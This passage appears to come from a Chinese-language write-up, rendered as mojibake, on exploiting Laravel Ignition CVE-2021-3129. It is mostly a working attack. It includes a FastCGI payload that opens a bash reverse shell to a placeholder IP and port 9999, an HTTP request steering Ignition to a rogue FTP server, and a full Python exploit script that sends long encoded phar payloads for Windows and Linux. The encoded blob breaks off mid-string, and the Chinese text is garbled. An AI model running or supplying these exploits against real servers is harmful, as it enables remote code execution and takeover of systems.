/dev/tcp/xxx.xxx.xxx.xxx/9999 0>&1\" # ËøôÈáåËæìÂÖ•ÁöÑÊòØË¶ÅÊâßË°åÁöÑÂëΩ‰ª§ ÂæóÂà∞payloadÔºåËÄåÊàë‰ª¨ÈúÄË¶ÅÁöÑÊòØ‰∏äÈù¢payload‰∏≠ _ÂêéÈù¢ÁöÑÊï∞ÊçÆÈÉ®ÂàÜÔºåÂç≥Ôºö %01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%07%07%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH106%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%19SCRIPT_FILENAME/var/www/public/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00j%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/xxx.xxx.xxx.xxx/9999%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00 Â∞ÜÊï∞ÊçÆÊ∑ªÂä†Âà∞Â¶Ç‰∏ãFTPËÑöÊú¨‰∏≠ÁöÑpayload(ËÑöÊú¨Âú®ÊñáÁ´†Êú´Â∞æÂíå POCÁõÆÂΩï‰∏≠) ÁõëÂê¨ÂàöÂàöÁöÑÂèçÂºπshellÁ´ØÂè£Âπ∂ËøêË°å FTPËÑöÊú¨ ÂèëÈÄÅËØ∑Ê±ÇÂèçÂºπshell POST /_ignition/execute-solution HTTP/1.1 Host: xxx.xxx.xxx.xxx:8888 Content-Type: application/json Content-Length: 191 { \"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\", \"parameters\": { \"variableName\": \"username\", \"viewFile\": \"ftp://aaa@xxx.xxx.xxx.xxx:23/123\" } } [!NOTE] ‰ΩøÁî®DockerÁéØÂ¢ÉÊó†Ê≥ïÂ§çÁé∞ÔºåÈúÄË¶ÅÊê≠Âª∫Âè¶‰∏Ä‰∏™ÁéØÂ¢É ÊºèÊ¥ûÂà©Áî®POC https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP/blob/main/laravel-CVE-2021-3129-EXP.py # -*- coding: utf-8 -*- import requests,json import sys,re proxies = { \"http\": '127.0.0.1:8080'} header={ \"User-Agent\":\"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0\", \"Content-Type\":\"application/json\" } def clearlog(url): data = { \"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\", \"parameters\": { \"variableName\":\"username\", \"viewFile\": \"php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log\" } } req=requests.post(url,headers=header,data=json.dumps(data,indent=1)) return req def AA(url): data={ \"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\", \"parameters\": { \"variableName\":\"username\", \"viewFile\": \"AA\" } } req=requests.post(url,headers=header,data=json.dumps(data,indent=1)) return req def sendpayloadwindows(url): data={ \"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\", \"parameters\": { \"variableName\":\"username\", \"viewFile\": \"=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=71=00=2F=00=42=00=77=00=41=00=41=00=41=00=67=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=42=00=6F=00=42=00=77=00=41=00=41=00=54=00=7A=00=6F=00=7A=00=4D=00=6A=00=6F=00=69=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=46=00=4E=00=35=00=63=00=32=00=78=00=76=00=5A=00=31=00=56=00=6B=00=63=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4F=00=54=00=6F=00=69=00=41=00=43=00=6F=00=41=00=63=00=32=00=39=00=6A=00=61=00=32=00=56=00=30=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=49=00=35=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=35=00=76=00=62=00=47=00=39=00=6E=00=58=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=4A=00=63=00=51=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=53=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=36=00=4E=00=7A=00=70=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=61=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=37=00=54=00=7A=00=6F=00=79=00=4F=00=54=00=6F=00=69=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=45=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6B=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=63=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=41=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=30=00=34=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=55=00=32=00=6C=00=36=00=5A=00=53=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=6B=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=69=00=49=00=37=00=59=00=54=00=6F=00=78=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=59=00=54=00=6F=00=79=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=63=00=7A=00=6F=00=32=00=4E=00=44=00=45=00=36=00=49=00=6D=00=56=00=6A=00=61=00=47=00=38=00=67=00=58=00=6A=00=77=00=2F=00=63=00=47=00=68=00=77=00=49=00=48=00=4E=00=6C=00=63=00=33=00=4E=00=70=00=62=00=32=00=35=00=66=00=63=00=33=00=52=00=68=00=63=00=6E=00=51=00=6F=00=4B=00=54=00=74=00=41=00=63=00=32=00=56=00=30=00=58=00=33=00=52=00=70=00=62=00=57=00=56=00=66=00=62=00=47=00=6C=00=74=00=61=00=58=00=51=00=6F=00=4D=00=43=00=6B=00=37=00=51=00=47=00=56=00=79=00=63=00=6D=00=39=00=79=00=58=00=33=00=4A=00=6C=00=63=00=47=00=39=00=79=00=64=00=47=00=6C=00=75=00=5A=00=79=00=67=00=77=00=4B=00=54=00=74=00=6D=00=64=00=57=00=35=00=6A=00=64=00=47=00=6C=00=76=00=62=00=69=00=42=00=46=00=4B=00=46=00=34=00=6B=00=52=00=43=00=78=00=65=00=4A=00=45=00=73=00=70=00=65=00=32=00=5A=00=76=00=63=00=69=00=68=00=65=00=4A=00=47=00=6B=00=39=00=4D=00=44=00=74=00=65=00=4A=00=47=00=6C=00=65=00=50=00=48=00=4E=00=30=00=63=00=6D=00=78=00=6C=00=62=00=69=00=68=00=65=00=4A=00=45=00=51=00=70=00=4F=00=31=00=34=00=6B=00=61=00=53=00=73=00=72=00=4B=00=53=00=42=00=37=00=58=00=69=00=52=00=45=00=57=00=31=00=34=00=6B=00=61=00=56=00=30=00=67=00=50=00=53=00=42=00=65=00=4A=00=45=00=52=00=62=00=58=00=69=00=52=00=70=00=58=00=56=00=35=00=65=00=58=00=69=00=52=00=4C=00=57=00=31=00=34=00=6B=00=61=00=53=00=73=00=78=00=58=00=69=00=59=00=78=00=4E=00=56=00=30=00=37=00=66=00=58=00=4A=00=6C=00=64=00=48=00=56=00=79=00=62=00=69=00=42=00=65=00=4A=00=45=00=51=00=37=00=66=00=57=00=5A=00=31=00=62=00=6D=00=4E=00=30=00=61=00=57=00=39=00=75=00=49=00=46=00=45=00=6F=00=58=00=69=00=52=00=45=00=4B=00=58=00=74=00=79=00=5A=00=58=00=52=00=31=00=63=00=6D=00=34=00=67=00=59=00=6D=00=46=00=7A=00=5A=00=54=00=59=00=30=00=58=00=32=00=56=00=75=00=59=00=32=00=39=00=6B=00=5A=00=53=00=68=00=65=00=4A=00=45=00=51=00=70=00=4F=00=33=00=31=00=6D=00=64=00=57=00=35=00=6A=00=64=00=47=00=6C=00=76=00=62=00=69=00=42=00=50=00=4B=00=46=00=34=00=6B=00=52=00=43=00=6C=00=37=00=63=00=6D=00=56=00=30=00=64=00=58=00=4A=00=75=00=49=00=47=00=4A=00=68=00=63=00=32=00=55=00=32=00=4E=00=46=00=39=00=6B=00=5A=00=57=00=4E=00=76=00=5A=00=47=00=55=00=6F=00=58=00=69=00=52=00=45=00=4B=00=54=00=74=00=39=00=58=00=69=00=52=00=51=00=50=00=53=00=64=00=77=00=59=00=58=00=4E=00=7A=00=4A=00=7A=00=74=00=65=00=4A=00=46=00=59=00=39=00=4A=00=33=00=42=00=68=00=65=00=57=00=78=00=76=00=59=00=57=00=51=00=6E=00=4F=00=31=00=34=00=6B=00=56=00=44=00=30=00=6E=00=4D=00=32=00=4D=00=32=00=5A=00=54=00=42=00=69=00=4F=00=47=00=45=00=35=00=59=00=7A=00=45=00=31=00=4D=00=6A=00=49=00=30=00=59=00=53=00=63=00=37=00=61=00=57=00=59=00=67=00=4B=00=47=00=6C=00=7A=00=63=00=32=00=56=00=30=00=4B=00=46=00=34=00=6B=00=58=00=31=00=42=00=50=00=55=00=31=00=52=00=62=00=58=00=69=00=52=00=51=00=58=00=53=00=6B=00=70=00=65=00=31=00=34=00=6B=00=52=00=6A=00=31=00=50=00=4B=00=45=00=55=00=6F=00=54=00=79=00=68=00=65=00=4A=00=46=00=39=00=51=00=54=00=31=00=4E=00=55=00=57=00=31=00=34=00=6B=00=55=00=46=00=30=00=70=00=4C=00=46=00=34=00=6B=00=56=00=43=00=6B=00=70=00=4F=00=32=00=6C=00=6D=00=49=00=43=00=68=00=70=00=63=00=33=00=4E=00=6C=00=64=00=43=00=68=00=65=00=4A=00=46=00=39=00=54=00=52=00=56=00=4E=00=54=00=53=00=55=00=39=00=4F=00=57=00=31=00=34=00=6B=00=56=00=6C=00=30=00=70=00=4B=00=58=00=74=00=65=00=4A=00=45=00=77=00=39=00=58=00=69=00=52=00=66=00=55=00=30=00=56=00=54=00=55=00=30=00=6C=00=50=00=54=00=6C=00=74=00=65=00=4A=00=46=00=5A=00=64=00=4F=00=31=00=34=00=6B=00=51=00=54=00=31=00=6C=00=65=00=48=00=42=00=73=00=62=00=32=00=52=00=6C=00=4B=00=43=00=64=00=65=00=66=00=43=00=63=00=73=00=58=00=69=00=52=00=4D=00=4B=00=54=00=74=00=6A=00=62=00=47=00=46=00=7A=00=63=00=79=00=42=00=44=00=65=00=33=00=42=00=31=00=59=00=6D=00=78=00=70=00=59=00=79=00=42=00=6D=00=64=00=57=00=35=00=6A=00=64=00=47=00=6C=00=76=00=62=00=69=00=42=00=75=00=64=00=6D=00=39=00=72=00=5A=00=53=00=68=00=65=00=4A=00=48=00=41=00=70=00=49=00=48=00=74=00=6C=00=64=00=6D=00=46=00=73=00=4B=00=46=00=34=00=6B=00=63=00=43=00=34=00=69=00=49=00=69=00=6B=00=37=00=66=00=58=00=31=00=65=00=4A=00=46=00=49=00=39=00=62=00=6D=00=56=00=33=00=49=00=45=00=4D=00=6F=00=4B=00=54=00=74=00=65=00=4A=00=46=00=49=00=74=00=58=00=6A=00=35=00=75=00=64=00=6D=00=39=00=72=00=5A=00=53=00=68=00=65=00=4A=00=45=00=46=00=62=00=4D=00=46=00=30=00=70=00=4F=00=32=00=56=00=6A=00=61=00=47=00=38=00=67=00=63=00=33=00=56=00=69=00=63=00=33=00=52=00=79=00=4B=00=47=00=31=00=6B=00=4E=00=53=00=68=00=65=00=4A=00=46=00=41=00=75=00=58=00=69=00=52=00=55=00=4B=00=53=00=77=00=77=00=4C=00=44=00=45=00=32=00=4B=00=54=00=74=00=6C=00=59=00=32=00=68=00=76=00=49=00=46=00=45=00=6F=00=52=00=53=00=68=00=41=00=63=00=6E=00=56=00=75=00=4B=00=46=00=34=00=6B=00=52=00=69=00=6B=00=73=00=58=00=69=00=52=00=55=00=4B=00=53=00=6B=00=37=00=5A=00=57=00=4E=00=6F=00=62=00=79=00=42=00=7A=00=64=00=57=00=4A=00=7A=00=64=00=48=00=49=00=6F=00=62=00=57=00=51=00=31=00=4B=00=46=00=34=00=6B=00=55=00=43=00=35=00=65=00=4A=00=46=00=51=00=70=00=4C=00=44=00=45=00=32=00=4B=00=54=00=74=00=39=00=5A=00=57=00=78=00=7A=00=5A=00=58=00=74=00=65=00=4A=00=46=00=39=00=54=00=52=00=56=00=4E=00=54=00=53=00=55=00=39=00=4F=00=57=00=31=00=34=00=6B=00=56=00=6C=00=30=00=39=00=58=00=69=00=52=00=47=00=4F=00=33=00=31=00=39=00=49=00=44=00=34=00=75=00=4C=00=32=00=5A=00=31=00=59=00=32=00=74=00=35=00=62=00=33=00=55=00=75=00=63=00=47=00=68=00=77=00=49=00=6A=00=74=00=7A=00=4F=00=6A=00=55=00=36=00=49=00=6D=00=78=00=6C=00=64=00=6D=00=56=00=73=00=49=00=6A=00=74=00=4F=00=4F=00=33=00=31=00=39=00=63=00=7A=00=6F=00=34=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=73=00=5A=00=58=00=5A=00=6C=00=62=00=43=00=49=00=37=00=54=00=6A=00=74=00=7A=00=4F=00=6A=00=45=00=30=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=70=00=62=00=6D=00=6C=00=30=00=61=00=57=00=46=00=73=00=61=00=58=00=70=00=6C=00=5A=00=43=00=49=00=37=00=59=00=6A=00=6F=00=78=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=51=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6B=00=78=00=70=00=62=00=57=00=6C=00=30=00=49=00=6A=00=74=00=70=00=4F=00=69=00=30=00=78=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=4D=00=36=00=49=00=67=00=41=00=71=00=41=00=48=00=42=00=79=00=62=00=32=00=4E=00=6C=00=63=00=33=00=4E=00=76=00=63=00=6E=00=4D=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=33=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=59=00=33=00=56=00=79=00=63=00=6D=00=56=00=75=00=64=00=43=00=49=00=37=00=61=00=54=00=6F=00=78=00=4F=00=33=00=4D=00=36=00=4E=00=6A=00=6F=00=69=00=63=00=33=00=6C=00=7A=00=64=00=47=00=56=00=74=00=49=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4D=00=54=00=4D=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6C=00=4E=00=70=00=65=00=6D=00=55=00=69=00=4F=00=32=00=6B=00=36=00=4C=00=54=00=45=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=69=00=64=00=57=00=5A=00=6D=00=5A=00=58=00=49=00=69=00=4F=00=32=00=45=00=36=00=4D=00=54=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=33=00=4D=00=36=00=4E=00=6A=00=51=00=78=00=4F=00=69=00=4A=00=6C=00=59=00=32=00=68=00=76=00=49=00=46=00=34=00=38=00=50=00=33=00=42=00=6F=00=63=00=43=00=42=00=7A=00=5A=00=58=00=4E=00=7A=00=61=00=57=00=39=00=75=00=58=00=33=00=4E=00=30=00=59=00=58=00=4A=00=30=00=4B=00=43=00=6B=00=37=00=51=00=48=00=4E=00=6C=00=64=00=46=00=39=00=30=00=61=00=57=00=31=00=6C=00=58=00=32=00=78=00=70=00=62=00=57=00=6C=00=30=00=4B=00=44=00=41=00=70=00=4F=00=30=00=42=00=6C=00=63=00=6E=00=4A=00=76=00=63=00=6C=00=39=00=79=00=5A=00=58=00=42=00=76=00=63=00=6E=00=52=00=70=00=62=00=6D=00=63=00=6F=00=4D=00=43=00=6B=00=37=00=5A=00=6E=00=56=00=75=00=59=00=33=00=52=00=70=00=62=00=32=00=34=00=67=00=52=00=53=00=68=00=65=00=4A=00=45=00=51=00=73=00=58=00=69=00=52=00=4C=00=4B=00=58=00=74=00=6D=00=62=00=33=00=49=00=6F=00=58=00=69=00=52=00=70=00=50=00=54=00=41=00=37=00=58=00=69=00=52=00=70=00=58=00=6A=00=78=00=7A=00=64=00=48=00=4A=00=73=00=5A=00=57=00=34=00=6F=00=58=00=69=00=52=00=45=00=4B=00=54=00=74=00=65=00=4A=00=47=00=6B=00=72=00=4B=00=79=00=6B=00=67=00=65=00=31=00=34=00=6B=00=52=00=46=00=74=00=65=00=4A=00=47=00=6C=00=64=00=49=00=44=00=30=00=67=00=58=00=69=00=52=00=45=00=57=00=31=00=34=00=6B=00=61=00=56=00=31=00=65=00=58=00=6C=00=34=00=6B=00=53=00=31=00=74=00=65=00=4A=00=47=00=6B=00=72=00=4D=00=56=00=34=00=6D=00=4D=00=54=00=56=00=64=00=4F=00=33=00=31=00=79=00=5A=00=58=00=52=00=31=00=63=00=6D=00=34=00=67=00=58=00=69=00=52=00=45=00=4F=00=33=00=31=00=6D=00=64=00=57=00=35=00=6A=00=64=00=47=00=6C=00=76=00=62=00=69=00=42=00=52=00=4B=00=46=00=34=00=6B=00=52=00=43=00=6C=00=37=00=63=00=6D=00=56=00=30=00=64=00=58=00=4A=00=75=00=49=00=47=00=4A=00=68=00=63=00=32=00=55=00=32=00=4E=00=46=00=39=00=6C=00=62=00=6D=00=4E=00=76=00=5A=00=47=00=55=00=6F=00=58=00=69=00=52=00=45=00=4B=00=54=00=74=00=39=00=5A=00=6E=00=56=00=75=00=59=00=33=00=52=00=70=00=62=00=32=00=34=00=67=00=54=00=79=00=68=00=65=00=4A=00=45=00=51=00=70=00=65=00=33=00=4A=00=6C=00=64=00=48=00=56=00=79=00=62=00=69=00=42=00=69=00=59=00=58=00=4E=00=6C=00=4E=00=6A=00=52=00=66=00=5A=00=47=00=56=00=6A=00=62=00=32=00=52=00=6C=00=4B=00=46=00=34=00=6B=00=52=00=43=00=6B=00=37=00=66=00=56=00=34=00=6B=00=55=00=44=00=30=00=6E=00=63=00=47=00=46=00=7A=00=63=00=79=00=63=00=37=00=58=00=69=00=52=00=57=00=50=00=53=00=64=00=77=00=59=00=58=00=6C=00=73=00=62=00=32=00=46=00=6B=00=4A=00=7A=00=74=00=65=00=4A=00=46=00=51=00=39=00=4A=00=7A=00=4E=00=6A=00=4E=00=6D=00=55=00=77=00=59=00=6A=00=68=00=68=00=4F=00=57=00=4D=00=78=00=4E=00=54=00=49=00=79=00=4E=00=47=00=45=00=6E=00=4F=00=32=00=6C=00=6D=00=49=00=43=00=68=00=70=00=63=00=33=00=4E=00=6C=00=64=00=43=00=68=00=65=00=4A=00=46=00=39=00=51=00=54=00=31=00=4E=00=55=00=57=00=31=00=34=00=6B=00=55=00=46=00=30=00=70=00=4B=00=58=00=74=00=65=00=4A=00=45=00=59=00=39=00=54=00=79=00=68=00=46=00=4B=00=45=00=38=00=6F=00=58=00=69=00=52=00=66=00=55=00=45=00=39=00=54=00=56=00=46=00=74=00=65=00=4A=00=46=00=42=00=64=00=4B=00=53=00=78=00=65=00=4A=00=46=00=51=00=70=00=4B=00=54=00=74=00=70=00=5A=00=69=00=41=00=6F=00=61=00=58=00=4E=00=7A=00=5A=00=58=00=51=00=6F=00=58=00=69=00=52=00=66=00=55=00=30=00=56=00=54=00=55=00=30=00=6C=00=50=00=54=00=6C=00=74=00=65=00=4A=00=46=00=5A=00=64=00=4B=00=53=00=6C=00=37=00=58=00=69=00=52=00=4D=00=50=00=56=00=34=00=6B=00=58=00=31=00=4E=00=46=00=55=00=31=00=4E=00=4A=00=54=00=30=00=35=00=62=00=58=00=69=00=52=00=57=00=58=00=54=00=74=00=65=00=4A=00=45=00=45=00=39=00=5A=00=58=00=68=00=77=00=62=00=47=00=39=00=6B=00=5A=00=53=00=67=00=6E=00=58=00=6E=00=77=00=6E=00=4C=00=46=00=34=00=6B=00=54=00=43=00=6B=00=37=00=59=00=32=00=78=00=68=00=63=00=33=00=4D=00=67=00=51=00=33=00=74=00=77=00=64=00=57=00=4A=00=73=00=61=00=57=00=4D=00=67=00=5A=00=6E=00=56=00=75=00=59=00=33=00=52=00=70=00=62=00=32=00=34=00=67=00=62=00=6E=00=5A=00=76=00=61=00=32=00=55=00=6F=00=58=00=69=00=52=00=77=00=4B=00=53=00=42=00=37=00=5A=00=58=00=5A=00=68=00=62=00=43=00=68=00=65=00=4A=00=48=00=41=00=75=00=49=00=69=00=49=00=70=00=4F=00=33=00=31=00=39=00=58=00=69=00=52=00=53=00=50=00=57=00=35=00=6C=00=64=00=79=00=42=00=44=00=4B=00=43=00=6B=00=37=00=58=00=69=00=52=00=53=00=4C=00=56=00=34=00=2B=00=62=00=6E=00=5A=00=76=00=61=00=32=00=55=00=6F=00=58=00=69=00=52=00=42=00=57=00=7A=00=42=00=64=00=4B=00=54=00=74=00=6C=00=59=00=32=00=68=00=76=00=49=00=48=00=4E=00=31=00=59=00=6E=00=4E=00=30=00=63=00=69=00=68=00=74=00=5A=00=44=00=55=00=6F=00=58=00=69=00=52=00=51=00=4C=00=6C=00=34=00=6B=00=56=00=43=00=6B=00=73=00=4D=00=43=00=77=00=78=00=4E=00=69=00=6B=00=37=00=5A=00=57=00=4E=00=6F=00=62=00=79=00=42=00=52=00=4B=00=45=00=55=00=6F=00=51=00=48=00=4A=00=31=00=62=00=69=00=68=00=65=00=4A=00=45=00=59=00=70=00=4C=00=46=00=34=00=6B=00=56=00=43=00=6B=00=70=00=4F=00=32=00=56=00=6A=00=61=00=47=00=38=00=67=00=63=00=33=00=56=00=69=00=63=00=33=00=52=00=79=00=4B=00=47=00=31=00=6B=00=4E=00=53=00=68=00=65=00=4A=00=46=00=41=00=75=00=58=00=69=00=52=00=55=00=4B=00=53=00=77=00=78=00=4E=00=69=00=6B=00=37=00=66=00=57=00=56=00=73=00=63=00=32=00=56=00=37=00=58=00=69=00=52=00=66=00=55=00=30=00=56=00=54=00=55=00=30=00=6C=00=50=00=54=00=6C=00=74=00=65=00=4A=00=46=00=5A=00=64=00=50=00=56=00=34=00=6B=00=52=00=6A=00=74=00=39=00=66=00=53=00=41=00=2B=00=4C=00=69=00=39=00=6D=00=64=00=57=00=4E=00=72=00=65=00=57=00=39=00=31=00=4C=00=6E=00=42=00=6F=00=63=00=43=00=49=00=37=00=63=00=7A=00=6F=00=31=00=4F=00=69=00=4A=00=73=00=5A=00=58=00=5A=00=6C=00=62=00=43=00=49=00=37=00=54=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=62=00=47=00=56=00=32=00=5A=00=57=00=77=00=69=00=4F=00=30=00=34=00=37=00=63=00=7A=00=6F=00=78=00=4E=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=61=00=57=00=35=00=70=00=64=00=47=00=6C=00=68=00=62=00=47=00=6C=00=36=00=5A=00=57=00=51=00=69=00=4F=00=32=00=49=00=36=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=45=00=30=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=69=00=64=00=57=00=5A=00=6D=00=5A=00=58=00=4A=00=4D=00=61=00=57=00=31=00=70=00=64=00=43=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=45=00=7A=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=77=00=63=00=6D=00=39=00=6A=00=5A=00=58=00=4E=00=7A=00=62=00=33=00=4A=00=7A=00=49=00=6A=00=74=00=68=00=4F=00=6A=00=49=00=36=00=65=00=32=00=6B=00=36=00=4D=00=44=00=74=00=7A=00=4F=00=6A=00=63=00=36=00=49=00=6D=00=4E=00=31=00=63=00=6E=00=4A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=32=00=6B=00=36=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=59=00=36=00=49=00=6E=00=4E=00=35=00=63=00=33=00=52=00=6C=00=62=00=53=00=49=00=37=00=66=00=58=00=31=00=39=00=42=00=51=00=41=00=41=00=41=00=47=00=52=00=31=00=62=00=57=00=31=00=35=00=42=00=41=00=41=00=41=00=41=00=41=00=4D=00=39=00=43=00=57=00=41=00=45=00=41=00=41=00=41=00=41=00=44=00=48=00=35=00=2F=00=32=00=4B=00=51=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=43=00=41=00=41=00=41=00=41=00=48=00=52=00=6C=00=63=00=33=00=51=00=75=00=64=00=48=00=68=00=30=00=42=00=41=00=41=00=41=00=41=00=41=00=4D=00=39=00=43=00=57=00=41=00=45=00=41=00=41=00=41=00=41=00=44=00=48=00=35=00=2F=00=32=00=4B=00=51=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=64=00=47=00=56=00=7A=00=64=00=48=00=52=00=6C=00=63=00=33=00=52=00=76=00=35=00=4F=00=50=00=6D=00=31=00=45=00=6C=00=61=00=48=00=76=00=4D=00=42=00=6E=00=46=00=53=00=54=00=2F=00=6E=00=53=00=36=00=54=00=2B=00=75=00=46=00=69=00=51=00=49=00=41=00=41=00=41=00=42=00=48=00=51=00=6B=00=31=00=43=00a\" } } req=requests.post(url,headers=header,data=json.dumps(data,indent=1)) return req def sendpayloadlinux(url): data={ \"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\", \"parameters\": { \"variableName\":\"username\", \"viewFile\": \"=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=72=00=39=00=43=00=41=00=41=00=41=00=41=00=67=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=43=00=6D=00=43=00=41=00=41=00=41=00=54=00=7A=00=6F=00=7A=00=4D=00=6A=00=6F=00=69=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=46=00=4E=00=35=00=63=00=32=00=78=00=76=00=5A=00=31=00=56=00=6B=00=63=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4F=00=54=00=6F=00=69=00=41=00=43=00=6F=00=41=00=63=00=32=00=39=00=6A=00=61=00=32=00=56=00=30=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=49=00=35=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=35=00=76=00=62=00=47=00=39=00=6E=00=58=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=4A=00=63=00=51=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=53=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=36=00=4E=00=7A=00=70=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=61=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=37=00=54=00=7A=00=6F=00=79=00=4F=00=54=00=6F=00=69=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=45=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6B=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=63=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=41=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=30=00=34=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=55=00=32=00=6C=00=36=